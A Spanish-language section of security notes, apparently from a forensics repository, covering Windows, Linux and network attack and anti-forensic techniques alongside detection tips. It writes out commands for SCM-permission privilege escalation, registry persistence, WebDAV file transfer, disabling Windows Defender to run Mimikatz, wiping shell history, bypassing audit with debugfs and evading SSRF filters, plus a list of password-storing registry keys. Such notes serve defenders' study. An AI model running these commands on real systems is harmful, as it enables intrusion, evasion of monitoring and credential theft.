LPE (Local Privilege Escalation) persistente y sin uso de archivos usando sc.exe otorgando permisos del SCM (Service Control Manager).

- https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager

```cmd
sc.exe sdset scmanager D:(A;;KA;;;WD)
[SC] SetServiceObjectSecurity SUCCESS
```

### 📜 DLL Hijacking *cscapi.dll*
Windows Explorer carga automáticamente cscapi.dll que nunca se encuentra. Podría se aprovechada para ejecutar un payload.

- https://twitter.com/D1rkMtr/status/1613568545757220864

```cmd
C:\Windows\cscapi.dll
```

### 📜 Otras técnicas de ejecución de CMD o PowerShell

Un actor malicioso puede crear en una nueva línea de comandos en Powershell con el comando "query", de forma que pueda generar persistencia en el sistema. Si previamente ejecuta el siguiente comando.
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Utilities\query" /v pwned /t REG_MULTI_SZ /d 0\01\0pwned\0powershell.exe
```

Al consultar la clave de registro se ejecutará una Powershell.exe.
```cmd
query pwned
```

La detección puede ser complicada si se reemplaza "powershell.exe" por un ejecutable malicioso o tipo [LOLbin](https://lolbas-project.github.io/).

### 📜 Uso de *type* para descargar o subir ficheros

1. Alojar un servidor WebDAV con acceso anónimo r/w
2. Download: 
```cmd
type \\webdav-ip\path\file.ext > C:\path\file.ext
```
3. Upload: 
```cmd
type C:\path\file.ext > \\webdav-ip\path\file.ext
```

### 📜 Bloquear conexiones USB: Rubber Ducky y Cactus WHID

- HID - Hardware ID 
- VID - Vendor ID
- PID - Product ID

**Rubber Ducky**.
```
HID\VID_03EB&PID_2401&REV_0100
```

**Cactus WHID** (whid-injector).
```
HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02
HID\VID_1B4F&PID_9208&MI_02&Col02
```

```ps
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDs' -Value 1 -PropertyType DWord
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDsRetroactive' -Value 1 -PropertyType DWord

New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_03EB&PID_2401&REV_0100' -Value 1 -PropertyType String
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&MI_02&Col02' -Value 1 -PropertyType String
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02' -Value 1 -PropertyType String
```

### 📜 Claves de registro de Windows donde se almacenan las contraseñas

Claves de registro de Windows donde se almacenan las contraseñas del sistema y de herramientas de terceros más comunes, buscadas en fases de Post-Explotación. 

Las claves se ordenan de mayor a menor ocurrencia.
```
KLM\Software\RealVNC\WinVNC4
HKCU\Software\SimonTatham\PuTTY\Sessions
HKCU\Software\ORL\WinVNC3\Password
HKLM\SYSTEM\Current\ControlSet\Services\SNMP
HKCU\Software\Polices\Microsoft\Windows\Installer
HKLM\SYSTEM\CurrentControlSet\Services\SNMP
HKCU\Software\TightVNC\Server
HKCU\Software\OpenSSH\Agent\Keys
HKLM\SYSTEM\CurrentControlSet\Control\LSA
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
HKLM\Software\RealVNC\vncserver
HKLM\Software\RealVNC\WinVNC4\Password
HKLM\Software\RealVNC
HKCU\Software\PremiumSoft\Navicat\Servers
HKLM\SYSTEM
HKLM\SAM
HKCU\Software\PremiumSoft\NavicatMONGODB\Servers
HKCU\Software\PremiumSoft\NavicatMSSQL\Servers
HKCU\Software\PremiumSoft\NavicatPG\Servers
HKCU\Software\PremiumSoft\NavicatSQLite\Servers
HKCU\Software\PremiumSoft\NavicatMARIADB\Servers
HKCU\Software\PremiumSoft\NavicatOra\Servers
HKCU\Software\TigerVNC\WinVNC4
```

### 📜 WDigest Authentication (lsass.exe): Habilitado / Deshabilitado

Si un malware habilita de forma forzada la autenticación [WDigest](https://datatracker.ietf.org/doc/html/rfc2617), las contraseñas se almacenarán en texto claro en la memoria del proceso lsass.exe (LSASS - Local Security Authority Subsystem Service). 

```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest

Deshabilitado: UseLogonCredential = 0 (Seguro)
Habilitado:    UseLogonCredential = 1 (Inseguro)
```

> [!NOTE]
> A partir de Windows 10 (versión 1507), esta opción está deshabilitada de forma predeterminada. En versiones anteriores de Windows, como Windows XP, 7, 8 y 8.1, está habilitada por defecto, lo que permite el almacenamiento de contraseñas en texto claro en memoria.

### 📜 Detectar si un sistema es una máquina física o virtual y su tipo de hipervisor o CSP (Azure, AWS, GCP)

PowerShell
```ps
Get-MpComputerStatus | Select-Object "IsVirtualMachine" | fl
```
```ps
Get-WmiObject -Class Win32_ComputerSystem | Select-Object -Property Model, Manufacturer
Get-WmiObject -Class Win32_BIOS | Select-Object -Property SMBIOSBIOSVersion
```

CMD
```cmd
WMIC BIOS > wmic_bios.txt

...
BIOSVersion     SMBIOSBIOSVersion
{"VBOX  -1"}    VirtualBox
...
```

GUI
```
msinfo32 /report > Producto de placa base
```

**Detectar CSP (Cloud Service Provider)**: Amazon EC2, Google Cloud, Alibaba Cloud, VMware, Inc., Microsoft Hyper-V, etc.
```ps
("HKLM:\HARDWARE\DESCRIPTION\System", "HKLM:\HARDWARE\DESCRIPTION\System\BIOS") | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object -Property SystemBiosVersion, SystemManufacturer, SystemProductName
```

### 📜 Técnicas de ofuscación en la ejecución de comandos en Windows

- https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation

### 📜 Detectar acciones de AutoRun al abrir una Command Prompt (cmd)

Un atacante creó un valor *"AutoRun"* en la siguiente clave de registro, aquí pudo agregar un comando malicioso como sus datos de valor. Ahora, cada vez que se inicie una consola cmd este comando se ejecutará automáticamente.
```
HKLM\SOFTWARE\Microsoft\Command Processor
```

### 📜 Extensiones ejecutables alternativas a .exe

Un atancante puede renombrar la extensión de un fichero malicioso a extensiones como: 

- **.pif**, **.scr** o **.com**

Todas se ejecutarán de la misma forma que .exe.

### 📜 Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (flujo NTFS en directorios $INDEX_ALLOCATION)

Un posible actor malicioso podría crear una carpeta visible a través de línea de comandos ejecutando un dir y/o también verla en un explorador de Windows. 

En ambas situaciones no es posible acceder a este directorio debibo a que el nombre no a sido creado como lo vemos en pantalla o en el output de consola, sino que es posible que haya sido creado con un punto al final del nombre, estableciendo un tipo de flujo *$INDEX_ALLOCATION* y un nombre de flujo *\$I30* o vacío, ambos son equivalentes. 

```
md <nombre_carpeta>.::$index_allocation
md <nombre_carpeta>.:$I30:$index_allocation
```

De esta forma aparecerá el nombre del cirectorio seguido de un punto, pero cuando se intente acceder a el ya sea de forma gráfica con doble clic o vía consola con "cd" se mostrará un mensaje de error indicando que la "ubicación no está disponible o no es correcta para ese equipo". Una manera de solucionar esto sería acceder vía "cd" en consola e indicando: "*nombre carpeta.+flujo vacío+tipo de flujo*". (Esto no está soportado en Powershell)

```
cd <nombre_carpeta>.::$index_allocation
cd <nombre_carpeta>.:$I30:$index_allocation
```

- Flujos NTFS: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3

Ejemplo
```
C:\malware>md test1
C:\malware>tree
Listado de rutas de carpetas
El número de serie del volumen es FFFFFF65 AC06:D3EE
C:.
├───test1
C:\malware>cd test1
C:\malware\test1>cd ..
C:\malware>md test2.::$index_allocation
C:\malware>tree
Listado de rutas de carpetas
El número de serie del volumen es FFFFFF65 AC06:D3EE
C:.
├───test1
└───test2.
C:\malware>cd test2.
El sistema no puede encontrar la ruta especificada.
C:\malware>cd test2.::$index_allocation
C:\malware\test2.::$index_allocation>cd ..
C:\malware>
```

### 📜 Windows Search Index: Detección de técnicas anti-forenses y evasión

Con relación a los artefactos comentados de [Windows Search Index (archivos Windows.edb, .crwl, .blf, .jrs)](#-windows-search-index-archivos-windowsedb-crwl-blf-jrs).

- **Reconstrucción del índice**: Borrar el historial indexado.
  - `Panel de control > Opciones de indización > Avanzado > Reconstruir`

- **Uso de extensiones no indexadas**: Archivos **.xyz**, **.dat** u otras extensiones no asociadas a un ***PersistentHandler*** no son indexados por defecto.

- **Manipulación de PersistentHandler**: Cambiar el comportamiento de cómo se procesan los archivos.
```reg
[HKEY_CLASSES_ROOT\.pdf]
@="exefile"
"PersistentHandler"="{098f2470-bae0-11cd-b579-08002b30bfeb}"
```

- **Desactivación del servicio de búsqueda**: (previamente comprometida una cuenta privilegiada)
  - Parar el servicio **WSearch**.
  - Deshabilitar o configurar el servicio mediante políticas de grupo o través de configuración local en el equipo vulnerable (services.msc o regedit).

- **Eliminación manual de los ficheros**: .crwl, .log y .edb

### 📜 Deshabilitar Windows Defender para eludir la detección de AMSI en la ejecución de binarios maliciosos (renombrar MsMpEng.exe a través del registro ControlSet00X)
Una forma de poder eludir el sistema de protección por defecto de Windows es renombrar el fichero del proceso de ejecución del servicio de Windows Defender. De forma que al iniciar el sistema este no se pueda ejecutar al no encontrar correctamente el nombre de este fichero que levanta el proceso de servicio de Windows Defender. Esto permite a actores maliciosos poder ejecutar binarios maliciosos como por ejemplo Mimikatz u otros.

**MsMpEng.exe** es el proceso principal de la aplicación antimalware Windows Defender. Windows Defender viene preinstalado en Windows 11 y Windows 10, ubicado en "*C:\Program Files\Windows Defender\MsMpEng.exe*"

Este proceso no se puede modificar renombrándolo ya que está constantantemente en uso, aunque se esté en contexto de usuario privilegiado como administrador. Pero lo que si es posible es renombrar la llamada de este fichero en el inicio del sistema, editando previamente las claves del registro correspondientes de "ControlSet00X" de forma offline: exportando, modificando la extensión del valor modificado de MsMpEng, creando una nueva clave ControlSet donde se importará este cambio, cambiar los valores por defecto del sistema a esta nueva clave para que inicie por defecto el sistema asignando este nuevo ControlSet y finalmente reiniciar el equipo.

1. Regedit > export hive: `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001` > guardar en nuevo fichero reg1.dat.
2. Editar desde [HxD](https://mh-nexus.de/en/hxd): 
    - Abrir reg1.dat > buscar "msmpeng.exe" > establecer "text encoding: Unicode UTF-16".
3. Renombrar extensión: "msmpeng.exe" en "msmpeng.xxx" > guardar reg1.dat.
4. Regedit > crear nueva key vacía > `HKEY_LOCAL_MACHINE\SYSTEM\ControlSet007` > import reg1.dat.
5. Por orden ControlSet001 es la clave que el sistema carga por defecto al iniciarse. Cambiar el orden de esta prioridad en la clave "HKLM\SYSTEM\Select" correspondiente del ControlSet creado anteriormente y correspondiente a ControlSet007:
    - Cambiar `HKEY_LOCAL_MACHINE\SYSTEM\Select` > "Current" > Value: 7
    - Cambiar `HKEY_LOCAL_MACHINE\SYSTEM\Select` > "Default" > Value: 7
    - Cambiar `HKEY_LOCAL_MACHINE\SYSTEM\Select` > "LastKnowGood" > Value: 7
6. Reiniciar equipo.

## 📁 Linux

### 📜 *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria
Si un actor malicioso accede a un archivo crítico, este puede estar auditado y los investigadores de SOC recibirán una alerta. Pero, si se usan el comando "*debugfs*" para acceder al archivo, es posible omitir esta alerta.
- https://gtfobins.github.io/gtfobins/debugfs
```bash
df -h
sudo debugfs /dev/sda1
debugfs: ls
debugfs: cat /etc/passwd
... modo interactivo ...
```

- Referencia: https://gtfobins.github.io

### 📜 Detectar la ejecución de comandos de forma oculta en history

Las líneas de historial con el sufijo * (asterisco) significa que ha sido modificado. Por ejemplo, usando la tecla hacia arriba (↑), se edita y luego se vuelve a presionar hacia arriba para cambiar a otro comando histórico sin presionar Enter. Cuando se vuelva a ejecutar history se verá que un comando del histórico a sido modificado pero no se sabrá cual fue el comando inicial ejecutado.

```bash
$ sudo bash malware.sh
$ history
    1  clear
    2  sudo bash malware.sh
    3  history
```

Presionar tecla hacia arriba (↑), modificar la cadena de texto, sin pulsar Enter volver cambiar a otro comando pasado pulsando nuevamente la tecla hacia arriba (↑), eliminar y volver ejecutar history para comprobar que el comando inicial no a sido almacenado sino sustituido sin ejecución.
```bash
$ sudo bash software.sh
$ history
    1  clear
    2* bash software.**sh**
    3  history
```

### 📜 Deshabilitar el uso del historial de la Shell

Un actor malicioso puede ejecutar estos comandos para no guardar o registrar en el archivo .bash_history el historial de acciones en la shell como técnica anti forense y evitar ser detectados.
```bash
export HISTFILE=/dev/null
export HISTFILESIZE=0
```

### 📜 Eliminar el historial de comandos de la Shell (.bash_history & .zsh_history)

Limpiar todo el historial del usuario actual.
```bash
history -cw
```

Limpiar el historial del usuario actual y salir sin dejar rastro.
```bash
history -cw && exit
```

Limpiar manualmente el historial, eliminando manualmente su contenido.
```bash
nano /home/user/.bash_history
nano /home/user/.zsh_history
```

Limpiar manualmente el historial, vaciando su contenido.
```bash
cat /home/user/.bash_history 2> /dev/null > /home/user/.bash_history
cat /home/user/.zsh_history 2> /dev/null > /home/user/.zsh_history
```

### 📜 Auditoría en el uso privilegiado de los siguientes comandos en Linux

Los siguientes comandos privilegiados deberían auditarse:
|   |   |   |   |   |   |
|:-:|:-:|:-:|:-:|:-:|:-:|
| agetty | cvsbug | fdisk | ipcs | mkswap | quotacheck |
| arp | debugfs | fsck | lpc |mountd | quotaoff |
| badblocks | dmesg | ftpd | lpd | nfsd | quotaon |
| Cfdisk | dumpe2fs | inetd | makedev | nslookup | renice | 
| Chroot | e2fsck | init | mke2fs | overchan | repquota |
| Crond | edquota | nndstart | mkfs | plipconfig | rpcinfo |
| ctrlaltdel | fdformat | ipcrm | mklost+found | portmap |

Los siguientes comandos no se instalan por defecto, no obstante en caso de instalarse por requerimientos del sistema deberían también ser auditados: 
|   |   |   |   |   |   |
|:-:|:-:|:-:|:-:|:-:|:-:|
| archive | expire | klogd | newsdaily | pppd | rpcrwalld |
| buffchan | expireover | named-xfer | newslog | pppstats | rquotad |
| chat | fastrm | named | newsrequeue | prunehistory | rpcrquotad |
| comsat | filechan | namedreload | nnrpd | rarp | rshd |

- Referencia: https://gtfobins.github.io

## 📁 Redes

### 📜 WAF Bypass (SSRF): usar acortamiento IP local

| Bloqueo            | Bypass           |
|--------------------|------------------|
| http://10.0.0.1    | http://1.1       |
| http://127.0.0.1   | http://127.1     |
| http://192.168.0.5 | http://192.168.5 |

### 📜 Dirección IPv6 asignada a IPv4 utilizada para ofuscación

Un dirección IPv6 se puede asignar a una dirección IPv4. Por lo tanto, si un actor malicioso intenta reconocer un servidor para conectarse a una dirección IPv4 y es bloqueado por la solución de seguridad. Probar esta técnica para ofuscar la comunicación y evitar posibles detecciones.

```
ping ::ffff:8.8.8.8
Haciendo ping a 8.8.8.8 con 32 bytes de datos:
Respuesta desde 8.8.8.8: bytes=32 tiempo=13ms TTL=117
```

Incluso la parte de IPv4 también se puede convertir a hexadecimal.
``` 
ping ::ffff:0808:0808
Haciendo ping a 8.8.8.8 con 32 bytes de datos:
Respuesta desde 8.8.8.8: bytes=32 tiempo=13ms TTL=117
```

- Referencia: https://isc.sans.edu/diary/30466

## 📁 Varios

### 📜 Forensia (Anti-Forensic)

Herramienta antiforense para Red Teamers, utilizada para borrar algunas huellas en la fase posterior a la explotación.

- https://github.com/PaulNorman01/Forensia